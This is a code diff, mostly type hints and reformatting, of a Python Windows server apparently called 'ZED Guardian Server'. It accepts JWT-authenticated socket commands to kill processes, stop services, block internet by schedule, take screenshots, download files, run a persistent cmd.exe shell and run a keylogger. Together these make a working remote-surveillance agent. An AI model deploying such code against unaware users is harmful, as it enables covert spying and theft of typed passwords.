@@ -1,3 +1,5 @@
+from __future__ import annotations
+
 import ctypes
 import json
 import logging
@@ -41,7 +43,7 @@ try:
 except PermissionError:
     # print(f"Permission denied: Unable to create directory or file at {COMMAND_OUTPUT_LOG}.")
     exit(1)
-except Exception as e:
+except IOError as e:
     # print(f"Unexpected error: {e}")
     exit(1)
 
@@ -52,6 +54,7 @@ def create_response(success: bool, message: str, data=None) -> dict:
 
 
 def verify_token(token: str) -> bool:
+    """Verify token and return the user data"""
     try:
         jwt.decode(token, SHARED_SECRET, algorithms=["HS256"])
         return True
@@ -68,6 +71,9 @@ class SystemInfoManager:
     Manages system-related information such as MAC address and location.
     """
 
+    def __init__(self):
+        pass
+
     @staticmethod
     def get_mac_address():
         """
@@ -78,9 +84,7 @@ class SystemInfoManager:
             for interface, addresses in interfaces.items():
                 for addr in addresses:
                     if addr.family == psutil.AF_LINK:
-                        return (
-                            addr.address
-                        )  # Return the first MAC address found
+                        return addr.address  # Return the first MAC address found
             return "Unknown MAC Address"
         except Exception as e:
             Logger.log("error", f"Error retrieving MAC address: {e}")
@@ -111,25 +115,27 @@ class SystemInfoManager:
 
 
 class Logger:
+    """Class for logging and managing server operations."""
+
+    def __init__(self):
+        pass
+
     LOG_FILE = os.path.join(DEFAULT_PATH, "logs", "server.log")
 
     @staticmethod
     def setup_logger():
-        try:
-            # Create the directory if it doesn't exist
-            log_dir = os.path.dirname(Logger.LOG_FILE)
-            if not os.path.exists(log_dir):
-                os.makedirs(log_dir, exist_ok=True)
+        """Setup logger"""
+        # Create the directory if it doesn't exist
+        log_dir = os.path.dirname(Logger.LOG_FILE)
+        if not os.path.exists(log_dir):
+            os.makedirs(log_dir, exist_ok=True)
 
-            logging.basicConfig(
-                filename=Logger.LOG_FILE,
-                level=logging.INFO,
-                format="%(asctime)s - %(levelname)s - %(message)s",
-            )
-            logging.info("Logger initialized.")
-        except Exception as e:
-            ...
-            # print(f"Failed to initialize logger: {e}")
+        logging.basicConfig(
+            filename=Logger.LOG_FILE,
+            level=logging.INFO,
+            format="%(asctime)s - %(levelname)s - %(message)s",
+        )
+        logging.info("Logger initialized.")
 
     @staticmethod
     def log(level, message):
@@ -143,6 +149,7 @@ class Logger:
 
     @staticmethod
     def set_log_level(level):
+        """Set log level"""
         level_map = {
             "debug": logging.DEBUG,
             "info": logging.INFO,
@@ -158,6 +165,7 @@ class Logger:
 
     @staticmethod
     def get_logs():
+        """Get logs"""
         try:
             with open(Logger.LOG_FILE, "r") as log_file:
                 logs = log_file.read()
@@ -168,6 +176,7 @@ class Logger:
 
     @staticmethod
     def clear_logs():
+        """Clear logs"""
         try:
             with open(Logger.LOG_FILE, "w") as log_file:
                 log_file.truncate(0)
@@ -179,41 +188,46 @@ class Logger:
 
 
 class ProcessManager:
+    """Class for managing process operations."""
+
+    def __init__(self):
+        pass
+
     @staticmethod
-    def get_processes():
+    def get_processes() -> dict:
+        """Get processes"""
         try:
             processes = [
                 proc.info
-                for proc in psutil.process_iter(
-                    attrs=["pid", "name", "username"]
-                )
+                for proc in psutil.process_iter(attrs=["pid", "name", "username"])
             ]
             Logger.log("info", "Fetched process list.")
-            return create_response(
-                True, "Processes fetched successfully.", processes
-            )
+            return create_response(True, "Processes fetched successfully.", processes)
         except Exception as e:
             Logger.log("error", f"Error fetching processes: {e}")
             return create_response(False, f"Error fetching processes: {e}")
 
     @staticmethod
-    def kill_process(pid: int):
+    def kill_process(pid: int) -> dict:
+        "Kill process by PID"
         try:
             psutil.Process(pid).terminate()
             Logger.log("info", f"Terminated process {pid}.")
-            return create_response(
-                True, f"Process {pid} terminated successfully."
-            )
+            return create_response(True, f"Process {pid} terminated successfully.")
         except Exception as e:
             Logger.log("error", f"Error terminating process {pid}: {e}")
-            return create_response(
-                False, f"Error terminating process {pid}: {e}"
-            )
+            return create_response(False, f"Error terminating process {pid}: {e}")
 
 
 class ServiceManager:
+    """Class for managing service operations."""
+
+    def __init__(self):
+        pass
+
     @staticmethod
-    def get_services():
+    def get_services() -> dict:
+        """Get services"""
         try:
             services = [
                 {
@@ -224,15 +238,14 @@ class ServiceManager:
                 for service in psutil.win_service_iter()
             ]
             Logger.log("info", "Fetched service list.")
-            return create_response(
-                True, "Services fetched successfully.", services
-            )
+            return create_response(True, "Services fetched successfully.", services)
         except Exception as e:
             Logger.log("error", f"Error fetching services: {e}")
             return create_response(False, f"Error fetching services: {e}")
 
     @staticmethod
-    def stop_service(service_name: str):
+    def stop_service(service_name: str) -> dict:
+        """Stop service"""
         try:
             result = subprocess.run(
                 ["sc", "stop", service_name],
@@ -252,247 +265,22 @@ class ServiceManager:
                 )
                 return create_response(False, result.stdout)
         except Exception as e:
-            Logger.log(
-                "error", f"Error stopping service '{service_name}': {e}"
-            )
+            Logger.log("error", f"Error stopping service '{service_name}': {e}")
             return create_response(
                 False, f"Error stopping service '{service_name}': {e}"
             )
 
 
-'''
-Old method, stop internet by setting invalid network settings and disabling interfaces.
-
 class NetworkManager:
-    is_blocked = False  # Tracks whether the internet is currently blocked
-    @staticmethod
-    def get_active_interfaces():
-        """
-        Retrieves a list of active network interfaces.
-        """
-        try:
-            result = subprocess.run(
-                ["netsh", "interface", "show", "interface"],
-                stdout=subprocess.PIPE,
-                text=True,
-                check=True,
-            )
-            interfaces = []
-            for line in result.stdout.splitlines():
-                match = re.search(r"Enabled\s+Connected\s+\S+\s+(.+)", line)
-                if match:
-                    interfaces.append(match.group(1).strip())
+    """Class for managing network operations."""
 
-            if not interfaces:
-                Logger.log("warning", "No active interfaces found.")
-            else:
-                Logger.log("info", f"Active interfaces: {interfaces}")
-            return interfaces
-        except subprocess.CalledProcessError as e:
-            Logger.log("error", f"Failed to retrieve interfaces: {e}")
-            return []
+    def __init__(self):
+        pass
 
-    @staticmethod
-    def set_invalid_network_settings(interface):
-        """
-        Sets invalid IP address, subnet mask, default gateway, and DNS for the given interface.
-        """
-        try:
-            subprocess.run(
-                [
-                    "netsh",
-                    "interface",
-                    "ip",
-                    "set",
-                    "address",
-                    f"name={interface}",
-                    "static",
-                    "1.1.1.1",
-                    "255.0.0.0",
-                    "1.1.1.1",
-                ],
-                check=True,
-            )
-            Logger.log("info", f"Set invalid network settings for {interface}")
-        except subprocess.CalledProcessError as e:
-            Logger.log(
-                "error", f"Failed to set invalid network settings for {interface}: {e}"
-            )
-
-    @staticmethod
-    def restore_dhcp(interface):
-        """
-        Restores DHCP for the given interface.
-        """
-        try:
-            # Restore both IP and DNS settings to DHCP
-            subprocess.run(
-                [
-                    "netsh",
-                    "interface",
-                    "ip",
-                    "set",
-                    "address",
-                    f"name={interface}",
-                    "source=dhcp",
-                ],
-                check=True,
-            )
-            subprocess.run(
-                [
-                    "netsh",
-                    "interface",
-                    "ip",
-                    "set",
-                    "dns",
-                    f"name={interface}",
-                    "source=dhcp",
-                ],
-                check=True,
-            )
-            Logger.log("info", f"Restored DHCP for interface: {interface}")
-        except subprocess.CalledProcessError as e:
-            Logger.log("error", f"Failed to restore DHCP for interface {interface}: {e}")
-
-    @staticmethod
-    def disable_interfaces():
-        """
-        Disables all active network interfaces.
-        """
-        interfaces = NetworkManager.get_active_interfaces()
-        for interface in interfaces:
-            try:
-                cmd = f"wmic path Win32_NetworkAdapter where \"NetConnectionID='{interface}' and NetEnabled=true\" call Disable"
-                result = subprocess.run(
-                    cmd,
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.PIPE,
-                    text=True,
-                    shell=True,
-                    check=False,
-                )
-                if result.returncode == 0:
-                    Logger.log("info", f"Disabled interface: {interface}")
-                else:
-                    Logger.log(
-                        "error",
-                        f"Failed to disable interface {interface}: {result.stderr}",
-                    )
-            except Exception as e:
-                Logger.log(
-                    "error", f"Unexpected error disabling interface {interface}: {e}"
-                )
-
-    @staticmethod
-    def enable_interfaces():
-        """
-        Enables all previously disabled network interfaces.
-        """
-        try:
-            result = subprocess.run(
-                [
-                    "wmic",
-                    "path",
-                    "Win32_NetworkAdapter",
-                    "where",
-                    "NetEnabled=false",
-                    "call",
-                    "Enable",
-                ],
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                text=True,
-                check=False,
-            )
-            if result.returncode == 0:
-                Logger.log(
-                    "info", "All disabled interfaces have been enabled successfully."
-                )
-            else:
-                Logger.log("error", f"Failed to enable interfaces: {result.stderr}")
-        except Exception as e:
-            Logger.log("error", f"Unexpected error enabling interfaces: {e}")
-
-    @staticmethod
-    def check_internet():
-        """
-        Checks internet connectivity by pinging a well-known server.
-        Returns True if the internet is accessible, otherwise False.
-        """
-        try:
-            subprocess.run(
-                ["ping", "-n", "1", "google.com"],
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                check=True,
-            )
-            Logger.log("info", "Internet is still accessible.")
-            return create_response(True, "Internet is still accessible.")
-        except subprocess.CalledProcessError:
-            Logger.log("info", "Internet is confirmed to be blocked.")
-            return create_response(False, "Internet is confirmed to be blocked.")
-
-    @staticmethod
-    def block_internet():
-        """
-        Blocks internet by setting invalid network settings and disabling interfaces.
-        """
-        if NetworkManager.is_blocked:
-            Logger.log(
-                "debug", "Internet is already blocked. Skipping redundant block."
-            )
-            return
-
-        interfaces = NetworkManager.get_active_interfaces()
-        if interfaces:
-            Logger.log("info", f"Blocking internet for interfaces: {interfaces}")
-            for interface in interfaces:
-                NetworkManager.set_invalid_network_settings(interface)
-            NetworkManager.disable_interfaces()
-            NetworkManager.is_blocked = True
-            Logger.log("info", "Internet block settings applied successfully.")
-
-        # Perform a global check for internet connectivity
-        check_result = NetworkManager.check_internet()
-        Logger.log("info", check_result["message"])
-
-    @staticmethod
-    def unblock_internet():
-        """
-        Unblocks internet by enabling interfaces and restoring DHCP settings.
-        """
-        if not NetworkManager.is_blocked:
-            Logger.log(
-                "debug", "Internet is already unblocked. Skipping redundant unblock."
-            )
-            return
-
-        try:
-            # Enable interfaces before restoring DHCP
-            NetworkManager.enable_interfaces()
-
-            interfaces = NetworkManager.get_active_interfaces()
-            if interfaces:
-                Logger.log("info", f"Restoring DHCP for interfaces: {interfaces}")
-                for interface in interfaces:
-                    NetworkManager.restore_dhcp(interface)
-
-            NetworkManager.is_blocked = False
-            Logger.log("info", "Internet unblocked successfully.")
-
-            # Perform a global check for internet connectivity
-            check_result = NetworkManager.check_internet()
-            Logger.log("info", check_result["message"])
-        except Exception as e:
-            Logger.log("error", f"Error unblocking internet: {e}")
-'''
-
-
-class NetworkManager:
     is_blocked = False  # Tracks whether the internet is currently blocked
 
     @staticmethod
-    def set_proxy(proxy_address):
+    def set_proxy(proxy_address: str) -> None:
         """
         Sets the system-wide proxy.
         """
@@ -529,15 +317,13 @@ class NetworkManager:
                 check=True,
             )
             # Notify the system of proxy changes
-            subprocess.run(
-                ["RunDll32.exe", "InetCpl.cpl,LaunchConnectionDialog"]
-            )
+            subprocess.run(["RunDll32.exe", "InetCpl.cpl,LaunchConnectionDialog"])
             Logger.log("info", f"Proxy set to {proxy_address}")
         except subprocess.CalledProcessError as e:
             Logger.log("error", f"Failed to set proxy: {e}")
 
     @staticmethod
-    def reset_proxy():
+    def reset_proxy() -> None:
         """
         Resets the system-wide proxy to default (disabled).
         """
@@ -559,15 +345,13 @@ class NetworkManager:
                 check=True,
             )
             # Notify the system of proxy changes
-            subprocess.run(
-                ["RunDll32.exe", "InetCpl.cpl,LaunchConnectionDialog"]
-            )
+            subprocess.run(["RunDll32.exe", "InetCpl.cpl,LaunchConnectionDialog"])
             Logger.log("info", "Proxy reset to default")
         except subprocess.CalledProcessError as e:
             Logger.log("error", f"Failed to reset proxy: {e}")
 
     @staticmethod
-    def check_internet():
+    def check_internet() -> dict:
         """
         Checks internet connectivity by pinging a well-known server.
         Returns True if the internet is accessible, otherwise False.
@@ -583,9 +367,7 @@ class NetworkManager:
             return create_response(True, "Internet is still accessible.")
         except subprocess.CalledProcessError:
             Logger.log("info", "Internet is confirmed to be blocked.")
-            return create_response(
-                False, "Internet is confirmed to be blocked."
-            )
+            return create_response(False, "Internet is confirmed to be blocked.")
 
     @staticmethod
     def block_internet():
@@ -607,7 +389,7 @@ class NetworkManager:
             Logger.log("error", f"Error blocking internet: {e}")
 
     @staticmethod
-    def unblock_internet():
+    def unblock_internet() -> None:
         """
         Unblocks internet by resetting the system-wide proxy settings.
         """
@@ -627,11 +409,20 @@ class NetworkManager:
 
 
 class SchedulerManager:
+    """Class for managing schedule operations."""
+
+    def __init__(self):
+        pass
+
     schedule = []  # Stores schedules
-    current_state = None  # Tracks if internet is blocked or unblocked ("blocked" or "unblocked")
+    current_state = (
+        None  # Tracks if internet is blocked or unblocked ("blocked" or "unblocked")
+    )
 
     @staticmethod
-    def add_schedule(schedule_type, date_or_day, start_time, end_time):
+    def add_schedule(
+        schedule_type: str, date_or_day: str, start_time: str, end_time: str
+    ) -> dict:
         """
         Adds a schedule with specific details (type, date_or_day, start, end) and evaluates whether to block/unblock.
         """
@@ -656,7 +447,7 @@ class SchedulerManager:
             return create_response(False, f"Error adding schedule: {e}")
 
     @staticmethod
-    def remove_schedule(index):
+    def remove_schedule(index: int) -> dict:
         """
         Removes a schedule by index and reevaluates.
         """
@@ -677,7 +468,7 @@ class SchedulerManager:
             return create_response(False, "Invalid schedule index.")
 
     @staticmethod
-    def list_schedules():
+    def list_schedules() -> dict:
         """
         Lists all current schedules, including type, date_or_day, start, and end.
         """
@@ -692,7 +483,7 @@ class SchedulerManager:
             return create_response(False, f"Error listing schedules: {e}")
 
     @staticmethod
-    def evaluate_schedule():
+    def evaluate_schedule() -> None:
         """
         Evaluates the current time and day against all schedules and blocks/unblocks the internet accordingly.
         """
@@ -728,14 +519,12 @@ class SchedulerManager:
         if should_block and SchedulerManager.current_state != "blocked":
             NetworkManager.block_internet()
             SchedulerManager.current_state = "blocked"
-        elif (
-            not should_block and SchedulerManager.current_state != "unblocked"
-        ):
+        elif not should_block and SchedulerManager.current_state != "unblocked":
             NetworkManager.unblock_internet()
             SchedulerManager.current_state = "unblocked"
 
     @staticmethod
-    def apply_schedule():
+    def apply_schedule() -> None:
         """
         Continuously applies internet restrictions based on the schedule.
         """
@@ -748,8 +537,11 @@ class SchedulerManager:
 class ScreenshotManager:
     """Class for handling screenshot operations."""
 
+    def __init__(self):
+        pass
+
     @staticmethod
-    def list_windows():
+    def list_windows() -> dict:
         """Fetches a list of open windows."""
         windows = []
 
@@ -763,7 +555,7 @@ class ScreenshotManager:
         return create_response(True, "Windows fetched successfully.", windows)
 
     @staticmethod
-    def capture_window(window_id):
+    def capture_window(window_id) -> dict:
         """Takes a screenshot of the specified window."""
         try:
             # Focus the target window
@@ -784,9 +576,7 @@ class ScreenshotManager:
             # Save the screenshot
             timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
             window_title = (
-                win32gui.GetWindowText(window_id)
-                .replace(" ", "_")
-                .replace(":", "-")
+                win32gui.GetWindowText(window_id).replace(" ", "_").replace(":", "-")
             )
             filename = f"{window_title}-{timestamp}.png"
             file_path = os.path.join(os.getcwd(), filename)
@@ -804,8 +594,12 @@ class ScreenshotManager:
 class FileManager:
     """Class to manage file-related operations."""
 
+    def __init__(self):
+        pass
+
     @staticmethod
-    def list_files(directory):
+    def list_files(directory: str) -> dict:
+        """Lists all files in the specified directory."""
         try:
             files = [
                 {
@@ -823,7 +617,8 @@ class FileManager:
             return create_response(False, f"Error listing files: {e}")
 
     @staticmethod
-    def download_file(file_path):
+    def download_file(file_path: str) -> dict:
+        """Downloads a file from the server."""
         try:
             if not os.path.isfile(file_path):
                 return create_response(False, "File does not exist.")
@@ -846,18 +641,19 @@ class ConsoleManager:
     Handles persistent execution of shell commands with an interactive cmd.exe session.
     """
 
+    def __init__(self):
+        pass
+
     process = None
     lock = threading.Lock()
 
     @staticmethod
-    def write_to_command_log(raw_output):
+    def write_to_command_log(raw_output: str) -> None:
         """
         Appends the raw output from the cmd.exe session to the log file immediately.
         """
         try:
-            if not COMMAND_OUTPUT_LOG or not os.path.exists(
-                COMMAND_OUTPUT_LOG
-            ):
+            if not COMMAND_OUTPUT_LOG or not os.path.exists(COMMAND_OUTPUT_LOG):
                 raise ValueError(
                     "Command output log path is not initialized or does not exist."
                 )
@@ -869,7 +665,7 @@ class ConsoleManager:
             Logger.log("error", f"Error writing to command log: {e}")
 
     @staticmethod
-    def ensure_shell():
+    def ensure_shell() -> None:
         """
         Ensures that the interactive cmd.exe process is running and captures the initial output.
         """
@@ -893,9 +689,7 @@ class ConsoleManager:
                 initial_output = ""
                 while True:
                     line = ConsoleManager.process.stdout.readline()
-                    if (
-                        not line.strip()
-                    ):  # Stop reading on the first empty line
+                    if not line.strip():  # Stop reading on the first empty line
                         break
                     initial_output += line
                     ConsoleManager.write_to_command_log(line)  # Log each line
@@ -909,7 +703,7 @@ class ConsoleManager:
             Logger.log("error", f"Failed to start or ensure shell: {e}")
 
     @staticmethod
-    def execute_command(command):
+    def execute_command(command: str) -> dict:
         """
         Executes a command in the persistent shell and writes the raw output to the log file immediately.
         """
@@ -945,15 +739,12 @@ class ConsoleManager:
             return create_response(False, f"Error executing command: {e}")
 
     @staticmethod
-    def stop_shell():
+    def stop_shell() -> dict:
         """
         Stops the persistent shell process.
         """
         try:
-            if (
-                ConsoleManager.process
-                and ConsoleManager.process.poll() is None
-            ):
+            if ConsoleManager.process and ConsoleManager.process.poll() is None:
                 ConsoleManager.process.terminate()
                 ConsoleManager.process = None
                 Logger.log("info", "Interactive cmd.exe shell stopped.")
@@ -972,12 +763,15 @@ class ConsoleManager:
 class KeyloggerManager:
     """Class for handling keylogging operations."""
 
+    def __init__(self):
+        pass
+
     key_logs = []  # List of log entries
     is_logging = False
     _listener_thread = None
 
     @staticmethod
-    def start_keylogger():
+    def start_keylogger() -> dict:
         """Starts the keylogger in a separate thread."""
         if KeyloggerManager.is_logging:
             return create_response(False, "Keylogger is already running.")
@@ -990,7 +784,7 @@ class KeyloggerManager:
         return create_response(True, "Keylogger started successfully.")
 
     @staticmethod
-    def stop_keylogger():
+    def stop_keylogger() -> dict:
         """Stops the keylogger and clears the logs."""
         if not KeyloggerManager.is_logging:
             return create_response(False, "Keylogger is not running.")
@@ -1000,23 +794,19 @@ class KeyloggerManager:
         return create_response(True, "Keylogger stopped and logs cleared.")
 
     @staticmethod
-    def get_logs():
+    def get_logs() -> dict:
         """Fetches the collected key logs."""
         formatted_logs = "".join(KeyloggerManager.key_logs)
-        return create_response(
-            True, "Key logs fetched successfully.", formatted_logs
-        )
+        return create_response(True, "Key logs fetched successfully.", formatted_logs)
 
     @staticmethod
-    def _run_keylogger():
+    def _run_keylogger() -> None:
         """Internal method to capture keypresses."""
-        with keyboard.Listener(
-            on_press=KeyloggerManager._on_key_press
-        ) as listener:
+        with keyboard.Listener(on_press=KeyloggerManager._on_key_press) as listener:
             listener.join()
 
     @staticmethod
-    def _on_key_press(key):
+    def _on_key_press(key: keyboard.Key) -> None | bool:
         """Handles key press events and formats logs."""
         if not KeyloggerManager.is_logging:
             return False
@@ -1039,9 +829,7 @@ class KeyloggerManager:
 
 COMMAND_HANDLERS = {
     "get_processes": lambda payload=None: ProcessManager.get_processes(),
-    "kill_process": lambda payload: ProcessManager.kill_process(
-        payload["pid"]
-    ),
+    "kill_process": lambda payload: ProcessManager.kill_process(payload["pid"]),
     "get_services": lambda payload=None: ServiceManager.get_services(),
     "stop_service": lambda payload: ServiceManager.stop_service(
         payload["service_name"]
@@ -1080,39 +868,27 @@ COMMAND_HANDLERS = {
             "location": SystemInfoManager.get_location(),
         },
     ),
-    "set_log_level": lambda payload: Logger.set_log_level(
-        payload.get("level")
-    ),
-    "list_files": lambda payload: FileManager.list_files(
-        payload.get("directory", ".")
-    ),
+    "set_log_level": lambda payload: Logger.set_log_level(payload.get("level")),
+    "list_files": lambda payload: FileManager.list_files(payload.get("directory", ".")),
     "download_file": lambda payload: FileManager.download_file(
         payload.get("file_path")
     ),
 }
 
 
-def send_response(conn, response: dict) -> None:
-    """
-    Sends a JSON response with a length prefix to the client.
-    """
+def send_response(conn: socket.socket, response: dict) -> None:
     try:
         response_str = json.dumps(response)
-        length_prefix = f"{len(response_str):<10}"  # Fixed-width length prefix
-        conn.sendall(
-            length_prefix.encode("utf-8") + response_str.encode("utf-8")
-        )
-        conn.shutdown(
-            socket.SHUT_WR
-        )  # Force flush and indicate no more writing
+        length_prefix = f"{len(response_str):<10}"
+        conn.sendall(length_prefix.encode("utf-8") + response_str.encode("utf-8"))
+        conn.shutdown(socket.SHUT_WR)
     except Exception as e:
-        Logger.log(
-            "error",
-            f"Error sending response: {e}",
-        )
+        Logger.log("error", f"Error sending response: {e}")
+    finally:
+        conn.close()  # Ensure socket is always closed
 
 
-def handle_client(conn):
+def handle_client(conn: socket.socket) -> None:
     """
     Handles client requests, processes commands, and sends responses.
     """
@@ -1147,9 +923,7 @@ def handle_client(conn):
                 send_response(conn, response)
 
             except json.JSONDecodeError:
-                send_response(
-                    conn, create_response(False, "Invalid JSON format.")
-                )
+                send_response(conn, create_response(False, "Invalid JSON format."))
             except Exception as e:
                 Logger.log(
                     "error",
@@ -1183,7 +957,5 @@ if __name__ == "__main__":
     Logger.log("info", "ZED Guardian Server started.")
 
     # Start the network scheduler in a separate thread
-    threading.Thread(
-        target=SchedulerManager.apply_schedule, daemon=True
-    ).start()
+    threading.Thread(target=SchedulerManager.apply_schedule, daemon=True).start()
     start_server()
